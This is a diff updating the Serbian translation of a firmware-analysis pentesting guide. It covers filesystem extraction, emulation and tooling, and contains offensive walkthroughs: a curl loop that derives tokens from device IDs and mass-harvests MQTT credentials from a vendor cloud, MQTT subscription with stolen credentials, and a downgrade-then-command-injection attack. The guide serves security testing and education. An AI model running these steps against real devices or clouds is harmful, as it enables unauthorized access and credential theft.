@@ -15,43 +15,46 @@ synology-encrypted-archive-decryption.md
 ../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
 {{#endref}}
 
+{{#ref}}
+android-mediatek-secure-boot-bl2_ext-bypass-el3.md
+{{#endref}}
 
-Firmver je osnovni softver koji omogućava uređajima da pravilno rade tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaktuju. Čuva se u trajnoj memoriji, što osigurava da uređaj ima pristup ključnim instrukcijama od trenutka kada se uključi, što vodi ka pokretanju operativnog sistema. Ispitivanje i eventualno modifikovanje firmvera je ključni korak u identifikaciji bezbednosnih ranjivosti.
+Firmver je osnovni softver koji omogućava uređajima da funkcionišu ispravno tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaguju. Smešten je u trajnoj memoriji, što osigurava da uređaj ima pristup ključnim instrukcijama od trenutka uključivanja, što vodi ka pokretanju operativnog sistema. Ispitivanje i eventualna modifikacija firmvera su ključni koraci u otkrivanju sigurnosnih ranjivosti.
 
 ## **Prikupljanje informacija**
 
-**Prikupljanje informacija** je kritičan početni korak za razumevanje sastava uređaja i tehnologija koje koristi. Ovaj proces uključuje prikupljanje podataka o:
+**Prikupljanje informacija** je kritični početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces uključuje prikupljanje podataka o:
 
-- CPU arhitekturi i operativnom sistemu koji koristi
-- bootloader specifics
-- hardverskom rasporedu i datasheets
-- metrikama codebase-a i lokacijama izvornog koda
-- eksternim libraries i tipovima licence
-- istoriji update-a i regulatornim sertifikatima
-- arhitektonskim i dijagramima toka
-- bezbednosnim procenama i identifikovanim ranjivostima
+- CPU arhitektura i operativni sistem koji koristi
+- Specifičnosti bootloader-a
+- Hardverski raspored i datasheet-ovi
+- Metrike codebase-a i lokacije izvornog koda
+- Eksterne biblioteke i tipovi licenci
+- Istorija ažuriranja i regulatorne sertifikacije
+- Arhitekturni dijagrami i dijagrami toka
+- Procene bezbednosti i identifikovane ranjivosti
 
-Za ovu svrhu, **open-source intelligence (OSINT)** alati su neprocenjivi, kao i analiza bilo kojih dostupnih open-source softverskih komponenti kroz manuelne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu static analysis koja se može iskoristiti za pronalaženje potencijalnih problema.
+Za ove svrhe, **open-source intelligence (OSINT)** alati su neprocenjivi, kao i analiza dostupnih open-source softverskih komponenti kroz manuelne i automatizovane procese pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.
 
-## **Dobavljanje firmvera**
+## **Dobijanje firmvera**
 
-Nabavka firmvera može se pristupiti na više načina, svaki sa različitim stepenom složenosti:
+Dobijanje firmvera može se pristupiti na više načina, svaki sa različitim nivoom složenosti:
 
-- **Direktno** od izvora (developers, manufacturers)
-- **Sastavljanje** iz priloženih instrukcija
+- **Direktno** od izvora (razvijači, proizvođači)
+- **Sastavljanje** prema priloženim uputstvima
 - **Preuzimanje** sa zvaničnih sajtova za podršku
-- Korišćenje **Google dork** upita za pronalaženje hostovanih firmware fajlova
-- Direktan pristup **cloud storage**-u, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
-- Presretanje **update**-a putem man-in-the-middle tehnika
-- **Extracting** iz uređaja preko konekcija kao što su **UART**, **JTAG**, ili **PICit**
-- **Sniffing** za zahteve za update unutar komunikacije uređaja
+- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
+- Pristupom direktno do **cloud storage** uz alate kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
+- Presretanje ažuriranja putem man-in-the-middle tehnika
+- **Vađenje** sa uređaja preko konekcija kao što su **UART**, **JTAG** ili **PICit**
+- **Sniffing** zahteva za ažuriranje u komunikaciji uređaja
 - Identifikovanje i korišćenje **hardcoded update endpoints**
-- **Dumping** iz bootloader-a ili mreže
+- **Dumping** iz bootloader-a ili preko mreže
 - Uklanjanje i čitanje memorijskog čipa, kada sve drugo zakaže, koristeći odgovarajuće hardverske alate
 
 ## Analiza firmvera
 
-Sada kada **imate firmver**, potrebno je izdvojiti informacije o njemu kako biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
+Sada kada **imate firmver**, potrebno je izdvojiti informacije o njemu da biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -60,25 +63,25 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-Ako ne nađete mnogo pomoću tih alata, proverite **entropiju** image-a sa `binwalk -E <bin>`, ako je entropija niska, verovatno nije enkriptovano. Ako je visoka, verovatno je enkriptovano (ili na neki način kompresovano).
+Ako ne nađete mnogo pomoću tih alata, proverite **entropy** slike sa `binwalk -E <bin>`; ako je entropy nizak, verovatno nije šifrovano. Ako je entropy visok, verovatno je šifrovano (ili na neki način kompresovano).
 
-Takođe, možete koristiti ove alate da ekstrahujete **fajlove ugrađene u firmware**:
+Pored toga, možete koristiti ove alate za izdvajanje **fajlova ugrađenih u firmware**:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
 {{#endref}}
 
-Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za inspekciju fajla.
+Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled fajla.
 
-### Dobijanje filesystema
+### Dobijanje filesystem-a
 
-Sa prethodno pomenutim alatima kao što je `binwalk -ev <bin>` trebalo bi da ste uspeli da **ekstrahujete filesystem**.\
-Binwalk obično ekstrahuje filesystem u **direktorijum nazvan prema tipu filesystema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+Sa prethodno pomenutim alatima kao što je `binwalk -ev <bin>` trebalo bi da ste bili u mogućnosti da **izvučete filesystem**.\
+Binwalk obično to izdvaja unutar **foldera nazvanog prema tipu filesystem-a**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
-#### Ručno ekstrahovanje filesystema
+#### Ručno izdvajanje filesystem-a
 
-Ponekad binwalk **neće imati magic byte filesystema u svojim potpisima**. U tim slučajevima, koristite binwalk da **pronađete offset filesystema i izrežete (carve) kompresovani filesystem** iz binarnog fajla i **ručno ekstrahujete** filesystem prema njegovom tipu koristeći korake ispod.
+Ponekad binwalk neće imati **magic byte** filesystem-a u svojim potpisima. U tim slučajevima, koristite binwalk da **pronađete offset filesystem-a i carve-ujete kompresovani filesystem** iz binarnog fajla i **ručno izdvojite** filesystem prema njegovom tipu koristeći korake ispod.
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -90,7 +93,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
-Pokrenite sledeću **dd command** carving the Squashfs filesystem.
+Pokrenite sledeću **dd command** za izdvajanje Squashfs datotečnog sistema.
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
@@ -100,37 +103,37 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
 8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
 ```
-Alternativno, može se pokrenuti i sledeća komanda.
+Alternatively, the following command could also be run.
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
-- Za squashfs (korišćen u gornjem primeru)
+- For squashfs (used in the example above)
 
 `$ unsquashfs dir.squashfs`
 
-Fajlovi će se nalaziti u "`squashfs-root`" direktorijumu nakon toga.
+Files will be in "`squashfs-root`" directory afterwards.
 
-- CPIO arhive
+- CPIO archive files
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
-- Za jffs2 datotečne sisteme
+- For jffs2 filesystems
 
 `$ jefferson rootfsfile.jffs2`
 
-- Za ubifs datotečne sisteme sa NAND flash
+- For ubifs filesystems with NAND flash
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
 `$ ubidump.py <bin>`
 
-## Analyzing Firmware
+## Analiza firmware-a
 
-Kada se firmware dobije, važno ga je rastaviti kako bi se razumeli njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.
+Kada je firmware dobijen, važno ga je rastaviti kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces uključuje korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware slike.
 
-### Initial Analysis Tools
+### Početni alati za analizu
 
-Dat je skup komandi za početni pregled binarnog fajla (označenog kao `<bin>`). Ove komande pomažu pri identifikaciji tipova fajlova, izvlačenju stringova, analizi binarnih podataka i razumevanju detalja particija i datotečnih sistema:
+Naveden je skup komandi za početnu inspekciju binarnog fajla (označenog kao `<bin>`). Ove komande pomažu u identifikaciji tipova fajlova, izdavanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i fajlsistemima:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -139,13 +142,13 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
-Da biste procenili da li je image enkriptovan, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.
+Da bi se procenio status enkripcije image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.
 
 Za ekstrakciju **ugrađenih fajlova**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.
 
-### Ekstrakcija datotečnog sistema
+### Ekstrakcija fajl-sistema
 
-Koristeći `binwalk -ev <bin>`, obično je moguće izdvojiti datotečni sistem, često u direktorijum nazvan prema tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne prepozna tip datotečnog sistema zbog nedostajućih magic bajtova, neophodna je ručna ekstrakcija. To podrazumeva korišćenje `binwalk` za lociranje offseta datotečnog sistema, nakon čega sledi `dd` komanda za izrezivanje datotečnog sistema:
+Korišćenjem `binwalk -ev <bin>`, obično se može izvaditi fajl-sistem, često u direktorijum nazvan po tipu fajl-sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl-sistema zbog nedostajućih magic bajtova, neophodna je ručna ekstrakcija. To uključuje korišćenje `binwalk`-a za lociranje offset-a fajl-sistema, nakon čega sledi `dd` komanda za izdvajanje fajl-sistema:
 ```bash
 $ binwalk DIR850L_REVB.bin
 
@@ -153,39 +156,39 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
 Nakon toga, u zavisnosti od tipa fajl-sistema (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.
 
-### Analiza fajl sistema
+### Analiza fajl-sistema
 
-Sa izvađenim fajl-sistemom, započinje potraga za bezbednosnim propustima. Pažnja se posvećuje insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts i compiled binaries za offline analizu.
+Kada je fajl-sistem izvađen, započinje potraga za bezbednosnim ranjivostima. Pažnja se poklanja nesigurnim mrežnim daemonima, hardkodiranim kredencijalima, API endpoint-ima, funkcionalnostima update servera, nekompajliranom kodu, startup skriptama i kompajliranim binarnim fajlovima za offline analizu.
 
-**Ključne lokacije** i **stavke** za pregled uključuju:
+**Ključne lokacije** i **stavke** koje treba pregledati uključuju:
 
-- **etc/shadow** i **etc/passwd** za korisničke kredencijale
-- SSL sertifikati i ključevi u **etc/ssl**
-- Konfiguracioni i skript fajlovi koji mogu sadržati ranjivosti
+- **etc/shadow** and **etc/passwd** for user credentials
+- SSL certificates and keys in **etc/ssl**
+- Konfiguracioni fajlovi i skripte zbog potencijalnih ranjivosti
 - Ugrađeni binarni fajlovi za dalju analizu
-- Uobičajeni web serveri i binarni fajlovi IoT uređaja
+- Uobičajeni web serveri za IoT uređaje i binarni fajlovi
 
-Više alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl-sistema:
+Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl-sistema:
 
-- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
-- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
-- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu
+- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
+- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
+- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis
 
-### Provere bezbednosti kompajliranih binarnih fajlova
+### Bezbednosne provere kompajliranih binarnih fajlova
 
-I izvorni kod i kompajlirani binarni fajlovi pronađeni u fajl-sistemu moraju se temeljno pregledati zbog ranjivosti. Alati poput **checksec.sh** za Unix binarne i **PESecurity** za Windows binarne pomažu u identifikaciji nezaštićenih binarnih fajlova koji se mogu iskoristiti.
+I izvorni kod i kompajlirani binarni fajlovi pronađeni u fajl-sistemu moraju biti pažljivo ispitani na ranjivosti. Alati kao što su **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne pomažu u identifikaciji nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.
 
-## Pribavljanje cloud config i MQTT credentials putem izvedenih URL tokena
+## Prikupljanje cloud konfiguracije i MQTT akredencijala putem izvedenih URL tokena
 
 Mnogi IoT hubovi preuzimaju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:
 
 - [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)
 
-Tokom analize firmware-a možete otkriti da je <token> izveden lokalno iz deviceId koristeći hardcoded secret, na primer:
+Tokom analize firmvera možete otkriti da je <token> izveden lokalno iz device ID-a koristeći hardkodirani secret, na primer:
 
 - token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
 
-Takav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i povuče cloud config, često otkrivajući plaintext MQTT credentials i prefikse topic-a.
+Ovaj dizajn omogućava bilo kome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, često otkrivajući plaintext MQTT akredencijale i prefikse topic-a.
 
 Praktičan tok rada:
 
@@ -195,31 +198,31 @@ Praktičan tok rada:
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
-- Potražite linije koje ispisuju cloud config URL pattern i broker address, na primer:
+- Potražite linije koje ispisuju obrazac cloud config URL-a i adresu brokera, na primer:
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
 ```
-2) Oporavi STATIC_KEY i algoritam tokena iz firmware-a
+2) Izdvoji STATIC_KEY i algoritam tokena iz firmvera
 
-- Učitaj binarije u Ghidra/radare2 i potraži putanju konfiguracije ("/pf/") ili upotrebu MD5.
+- Učitaj binarne fajlove u Ghidra/radare2 i potraži konfiguracionu putanju ("/pf/") ili upotrebu MD5.
 - Potvrdi algoritam (npr., MD5(deviceId||STATIC_KEY)).
-- Izvedi token u Bash i pretvori digest u velika slova:
+- Izvedi token u Bash-u i pretvori digest u velika slova:
 ```bash
 DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
 printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
-3) Prikupite cloud config i MQTT credentials
+3) Sakupi cloud konfiguraciju i MQTT kredencijale
 
-- Sastavite URL i preuzmite JSON pomoću curl; parsirajte sa jq da izdvojite secrets:
+- Sastavi URL i povuci JSON sa curl; parsiraj sa jq da izvučeš tajne:
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) Zloupotrebite plaintext MQTT i slabe topic ACLs (ako postoje)
+4) Iskoristite plaintext MQTT i slabe topic ACLs (ako postoje)
 
 - Koristite recovered credentials da se pretplatite na maintenance topics i tražite sensitive events:
 ```bash
@@ -227,10 +230,10 @@ mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 -i <client_id> -u <username> -P <password> \
 -t "<topic_prefix>/<deviceId>/admin" -v
 ```
-5) Enumerišite predvidljive ID-ove uređaja (u velikoj skali, uz autorizaciju)
+5) Izlistajte predvidive device ID-ove (u velikom obimu, uz autorizaciju)
 
-- Mnogi ekosistemi ugrađuju proizvođačev OUI i bajtove koji označavaju proizvod/tip, praćene sekvencijalnim sufiksom.
-- Možete iterativno prolaziti kroz kandidatske ID-e, izračunavati tokene i programatski dohvatati konfiguracije:
+- Mnogi ekosistemi ugrađuju vendor OUI/product/type bytes praćene sekvencijalnim sufiksom.
+- Možete iterirati kandidat device ID-ove, izvesti tokens i programatski dohvatiti configs:
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
@@ -240,71 +243,71 @@ curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.pas
 done
 ```
 Napomene
-- Uvek dobijte izričitu autorizaciju pre nego što pokušate mass enumeration.
-- Po mogućstvu preferirajte emulation ili static analysis kako biste povratili secrets bez modifikovanja target hardware kada je to moguće.
+- Uvek pribavite eksplicitnu autorizaciju pre pokušaja mass enumeration.
+- Kad god je moguće, preferirajte emulation ili static analysis kako biste oporavili tajne bez modifikovanja ciljnog hardvera.
 
-Proces emulating firmware omogućava **dynamic analysis** bilo rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na probleme zbog hardware ili architecture zavisnosti, ali prebacivanje root filesystem-a ili specifičnih binaries na uređaj sa odgovarajućom architecture i endianness-om, kao što je Raspberry Pi, ili na pre-built virtual machine, može olakšati dalja testiranja.
+Proces emulacije firmware omogućava **dynamic analysis** bilo rada uređaja bilo pojedinačnog programa. Ovakav pristup može naići na probleme zbog zavisnosti od hardvera ili architecture, ali prebacivanje root filesystem-a ili specifičnih binaries na uređaj sa istom architecture i endianness-om, kao što je Raspberry Pi, ili na pre-built virtual machine, može olakšati dalja testiranja.
 
-### Emulating Individual Binaries
+### Emulacija pojedinačnih binaries
 
-Za ispitivanje pojedinačnih programa, identifikacija programa endianness-a i CPU architecture je ključna.
+Za ispitivanje pojedinačnih programa, identifikacija endianness-a programa i CPU architecture je ključna.
 
-#### Primer za MIPS Architecture
+#### Primer sa MIPS Architecture
 
 Da biste emulirali MIPS architecture binary, možete koristiti komandu:
 ```bash
 file ./squashfs-root/bin/busybox
 ```
-A da instalirate neophodne alate za emulaciju:
+I da instalirate neophodne alate za emulaciju:
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
-For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.
+Za MIPS (big-endian), `qemu-mips` se koristi, a za little-endian binarne fajlove, izbor bi bio `qemu-mipsel`.
 
 #### Emulacija ARM arhitekture
 
-Za ARM binarne datoteke proces je sličan, koristeći emulator `qemu-arm` za emulaciju.
+Za ARM binarne fajlove, proces je sličan — koristi se emulator `qemu-arm` za emulaciju.
 
-### Emulacija celog sistema
+### Potpuna emulacija sistema
 
-Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi, olakšavaju potpunu emulaciju firmware-a, automatizuju proces i pomažu u dinamičkoj analizi.
+Alati poput [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi olakšavaju potpunu emulaciju firmvera, automatizujući proces i pomažući u dinamičkoj analizi.
 
 ## Dinamička analiza u praksi
 
-U ovoj fazi koristi se realno ili emulirano okruženje uređaja za analizu. Neophodno je održavati shell pristup OS-u i fajl-sistemu. Emulacija možda ne reprodukuje savršeno interakcije sa hardverom, što zahteva povremene restarte emulacije. Analiza treba da ponovo pregleda fajl-sistem, iskoristi izložene web stranice i mrežne servise, i istraži ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za identifikovanje potencijalnih backdoor ranjivosti.
+U ovoj fazi koristi se ili realno ili emulirano uređajno okruženje za analizu. Ključno je održavati shell pristup OS-u i filesystem-u. Emulacija možda neće savršeno oponašati hardverske interakcije, što zahteva povremena restartovanja emulacije. Analiza treba da ponovo pregleda filesystem, iskoristi izložene webpages i network servise, i istraži bootloader ranjivosti. Testovi integriteta firmvera su kritični za identifikaciju potencijalnih backdoor ranjivosti.
 
 ## Tehnike runtime analize
 
-Runtime analiza uključuje interakciju sa procesom ili binarnom datotekom u njegovom operativnom okruženju, koristeći alate kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoints-a i identifikovanje ranjivosti putem fuzzing-a i drugih tehnika.
+Runtime analiza podrazumeva interakciju sa procesom ili binarnim fajlom u njegovom izvršnom okruženju, koristeći alate kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-ova i identifikaciju ranjivosti kroz fuzzing i druge tehnike.
 
-## Eksploatacija binarnih datoteka i Proof-of-Concept
+## Eksploatacija binarnih fajlova i Proof-of-Concept
 
-Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljne arhitekture i programiranje u niskonivou jezicima. Zaštite binarnog runtime-a u ugrađenim sistemima su retke, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).
+Razvijanje PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljne arhitekture i programiranje u nižerazrednim jezicima. Binary runtime zaštite u embedded sistemima su retke, ali kada postoje, tehnike poput Return Oriented Programming (ROP) mogu biti neophodne.
 
-## Pripremljeni operativni sistemi za analizu firmware-a
+## Pripremljeni operativni sistemi za analizu firmvera
 
-Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prethodno konfigurisana okruženja za testiranje bezbednosti firmware-a, opremljena potrebnim alatima.
+Operativni sistemi poput [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju pre-konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena neophodnim alatima.
 
-## Pripremljeni OS-ovi za analizu firmware-a
+## Pripremljeni OS-ovi za analizu firmvera
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da vam pomogne pri izvođenju security assessment i penetration testing of Internet of Things (IoT) devices. Uštedeće vam mnogo vremena pružajući prethodno konfigurisano okruženje sa svim potrebnim alatima.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje ugrađene sigurnosti zasnovan na Ubuntu 18.04, unapred opremljen alatima za testiranje sigurnosti firmware-a.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da pomogne pri security assessment i pentestingu Internet of Things (IoT) uređaja. Štedi vreme pružajući prekonfigurisano okruženje sa svim neophodnim alatima.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti embedded uređaja zasnovan na Ubuntu 18.04, unapred opremljen alatima za testiranje bezbednosti firmvera.
 
-## Firmware Downgrade Attacks & Insecure Update Mechanisms
+## Napadi downgrade-a firmvera & nesigurni mehanizmi ažuriranja
 
-Čak i kada vendor implementira kriptografske provere potpisa za firmware slike, **zaštita od version rollback-a (downgrade) često se izostavlja**. Kada boot- ili recovery-loader samo verifikuje potpis ugrađenim javnim ključem, ali ne upoređuje *version* (ili monotoni brojač) slike koja se flash-uje, napadač može legitimno instalirati **stariju, ranjivu firmware verziju koja i dalje nosi važeći potpis** i tako ponovo uneti ranjivosti koje su bile zakrpljene.
+Čak i kada proizvođač implementira kriptografske provere potpisa za images firmvera, **zaštita protiv rollback-a verzije (downgrade) se često izostavlja**. Kada boot- ili recovery-loader samo verifikuje potpis ugrađenim javnim ključem, ali ne upoređuje *verziju* (ili monotoni brojač) image-a koji se flešuje, napadač može legitimno instalirati **stariji, ranjiv firmver koji i dalje nosi validan potpis** i tako ponovo uvesti ranjivosti koje su prethodno ispravljene.
 
 Tipičan tok napada:
 
-1. **Nabavite stariju potpisanu sliku**
-* Preuzmite je sa javnog download portala vendora, CDN-a ili sajta za podršku.
-* Ekstrahujte je iz pratećih mobilnih/desktop aplikacija (npr. unutar Android APK-a pod `assets/firmware/`).
-* Dohvatite je iz repozitorijuma trećih strana kao što su VirusTotal, Internet arhive, forumi, itd.
-2. **Otpremite ili poslužite sliku uređaju** preko bilo kog izloženog kanala za ažuriranje:
-* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
-* Mnogi potrošački IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blobove, dekodiraju ih na serverskoj strani i pokreću recovery/upgrade.
-3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command-injection koji je dodat kasnije).
-4. Opcionalno, vratite najnoviju sliku ili onemogućite ažuriranja da biste izbegli detekciju nakon sticanja perzistencije.
+1. **Obtain an older signed image**
+* Preuzmi ga sa javnog download portala proizvođača, CDN-a ili support sajta.
+* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
+* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
+2. **Upload or serve the image to the device** via any exposed update channel:
+* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
+* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih server-side i pokreću recovery/upgrade.
+3. Nakon downgrade-a, iskoristi ranjivost koja je popravljena u novijem izdanju (na primer command-injection filter koji je dodat kasnije).
+4. Opcionalno flešuj najnoviji image nazad ili onemogući update-e da bi se izbegla detekcija nakon što se postigne persistence.
 
 ### Primer: Command Injection nakon downgrade-a
 ```http
@@ -313,11 +316,11 @@ Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-U ranjivom (downgraded) firmware-u, parametar `md5` se konkatenira direktno u shell komandu bez sanitizacije, što omogućava injektovanje proizvoljnih komandi (u ovom slučaju – omogućavanje SSH key-based root access). Kasnije verzije firmvera su uvele osnovni filter karaktera, ali odsustvo downgrade protection čini zakrpu bez efekta.
+U ranjivoj (downgraded) firmware verziji, parametar `md5` se konkatenira direktno u shell komandu bez sanitizacije, što omogućava injektovanje proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter karaktera, ali izostanak zaštite od downgrade-a čini popravku bezvrednom.
 
-### Ekstrakcija firmvera iz mobilnih aplikacija
+### Vađenje firmware-a iz mobilnih aplikacija
 
-Mnogi proizvođači pakuju cele slike firmvera unutar svojih pratećih mobilnih aplikacija kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi-Fi. Ovi paketi se obično čuvaju nešifrovani u APK/APEX pod putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da izvučete potpisane slike bez dodirivanja fizičkog hardvera.
+Mnogi proizvođači ubacuju pune firmware image-e u njihove prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi-Fi. Ovi paketi se obično čuvaju nekriptovani u APK/APEX pod putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da izvučete potpisane slike bez diranja fizičkog hardvera.
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
@@ -325,17 +328,17 @@ firmware_v1.3.11.490_signed.bin
 ```
 ### Kontrolna lista za procenu logike ažuriranja
 
-* Da li su transport/autentikacija *update endpoint*-a adekvatno zaštićeni (TLS + authentication)?
